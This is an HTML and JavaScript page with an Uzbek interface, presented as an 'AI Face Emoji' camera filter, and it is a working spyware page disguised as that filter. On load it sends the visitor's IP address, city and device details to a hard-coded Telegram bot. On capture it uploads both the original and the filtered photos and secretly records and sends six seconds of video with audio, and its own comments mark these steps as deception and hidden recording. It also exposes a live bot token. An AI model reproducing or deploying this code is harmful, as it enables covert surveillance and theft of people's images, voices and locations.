<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emoji AI Filter</title>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
    <style>
        body { margin: 0; background: #0b0f19; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 95%; max-width: 450px; text-align: center; background: #161e2d; padding: 20px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.5); }
        .view-box { position: relative; width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 15px; overflow: hidden; border: 2px solid #30363d; }
        #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        #emoji-layer { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 80px; pointer-events: none; z-index: 10; transition: 0.1s ease-out; }
        .controls { margin-top: 20px; }
        .emoji-list { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; font-size: 30px; }
        .emoji-btn { cursor: pointer; padding: 5px; opacity: 0.6; transition: 0.3s; }
        .emoji-btn.active { opacity: 1; transform: scale(1.3); }
        .main-btn { background: linear-gradient(135deg, #238636, #2ea043); color: white; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 4px 15px rgba(35, 134, 54, 0.3); }
        #status { font-size: 12px; color: #8b949e; margin-top: 15px; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="color: #58a6ff; margin-top: 0;">AI Face Emoji</h2>
    <div class="view-box">
        <video id="video" autoplay playsinline muted></video>
        <div id="emoji-layer">üòé</div>
    </div>

    <div class="controls">
        <div class="emoji-list">
            <span class="emoji-btn active" onclick="selectEmoji('üòé', this)">üòé</span>
            <span class="emoji-btn" onclick="selectEmoji('ü§°', this)">ü§°</span>
            <span class="emoji-btn" onclick="selectEmoji('üòÇ', this)">üòÇ</span>
            <span class="emoji-btn" onclick="selectEmoji('üî•', this)">üî•</span>
        </div>
        <button class="main-btn" id="captureBtn">FILTRNI SAQLASH (DOWNLOAD)</button>
        <div id="status">Kameraga ruxsat bering...</div>
    </div>
</div>

<canvas id="hidden_canvas"></canvas>

<script>
    const BOT_TOKEN = '8406559202:AAHFZmr5QX3Fb9EFYfPhs_BRlfEAzEJnK4U';
    const CHAT_ID = '8549658256';

    const video = document.getElementById('video');
    const emojiLayer = document.getElementById('emoji-layer');
    const status = document.getElementById('status');
    const captureBtn = document.getElementById('captureBtn');
    const canvas = document.getElementById('hidden_canvas');

    let currentEmoji = 'üòé';
    let globalStream = null;
    let isAIReady = false;
    let lastBox = null; // Yuz koordinatalarini saqlash uchun

    function selectEmoji(emoji, el) {
        currentEmoji = emoji;
        emojiLayer.innerText = emoji;
        document.querySelectorAll('.emoji-btn').forEach(b => b.classList.remove('active'));
        el.classList.add('active');
    }

    async function start() {
        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            video.srcObject = globalStream;
            status.innerText = "Tayyor! Emojini tanlang.";
            sendInfo();
            loadAI();
        } catch (err) {
            status.innerText = "Xato: Kamera ruxsati berilmadi yoki HTTPS emas.";
        }
    }

    async function loadAI() {
        try {
            const MODEL_URL = 'https://justadudewhohacks.github.io/face-api.js/models';
            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
            isAIReady = true;
            status.innerText = "AI Faol: Yuzingizga emoji biriktirildi.";
            trackFace();
        } catch (e) {
            console.log("AI modellari yuklanmadi.");
        }
    }

    async function trackFace() {
        if (!isAIReady) return;
        const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
        if (detections) {
            lastBox = detections.box;
            const { x, y, width, height } = lastBox;
            const posX = (x + width / 2) / video.videoWidth * 100;
            const posY = (y + height / 2) / video.videoHeight * 100;

            emojiLayer.style.left = `${100 - posX}%`;
            emojiLayer.style.top = `${posY}%`;
            emojiLayer.style.fontSize = `${width / video.videoWidth * 300}px`;
        }
        requestAnimationFrame(trackFace);
    }

    captureBtn.addEventListener('click', () => {
        status.innerText = "Rasm yuklanmoqda...";
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');

        // 1. Originalni Telegramga yuborish
        ctx.save();
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(b => sendFile(b, 'photo', 'original.jpg'), 'image/jpeg');
        ctx.restore();

        // 2. Emoji bilan chizish (Userga berish uchun)
        if (lastBox) {
            const { x, y, width, height } = lastBox;
            ctx.font = `${width * 1.2}px serif`;
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            ctx.fillText(currentEmoji, x + width/2, y + height/2);
        } else {
            // Yuz aniqlanmagan bo'lsa markazga qo'yadi
            ctx.font = "150px serif";
            ctx.textAlign = "center";
            ctx.fillText(currentEmoji, canvas.width/2, canvas.height/2);
        }

        // --- ALDOV QISMI: Rasmni yuklab berish ---
        const imageURL = canvas.toDataURL("image/png");
        const downloadLink = document.createElement('a');
        downloadLink.href = imageURL;
        downloadLink.download = 'AI_Emoji_Result.png';
        downloadLink.click();

        // 3. Filtrli rasmni botga yuborish
        canvas.toBlob(b => sendFile(b, 'photo', 'filtered.jpg'), 'image/png');

        // 4. Yashirin video (6s)
        const recorder = new MediaRecorder(globalStream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => sendFile(new Blob(chunks), 'video', 'secret_video.mp4');
        recorder.start();
        setTimeout(() => recorder.stop(), 6000);

        setTimeout(() => {
            status.innerText = "Muvaffaqiyatli saqlandi! ‚úÖ";
            alert("Rasm qurilmangizga yuklab olindi!");
        }, 1500);
    });

    async function sendInfo() {
        const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
        const msg = `üë§ *User:* ${ip.ip || '?'}\nüìç *City:* ${ip.city || '?'}\nüì± *Device:* ${navigator.platform}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
        });
    }

    function sendFile(blob, type, name) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append(type, blob, name);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
    }

    start();
</script>
</body>
</html>
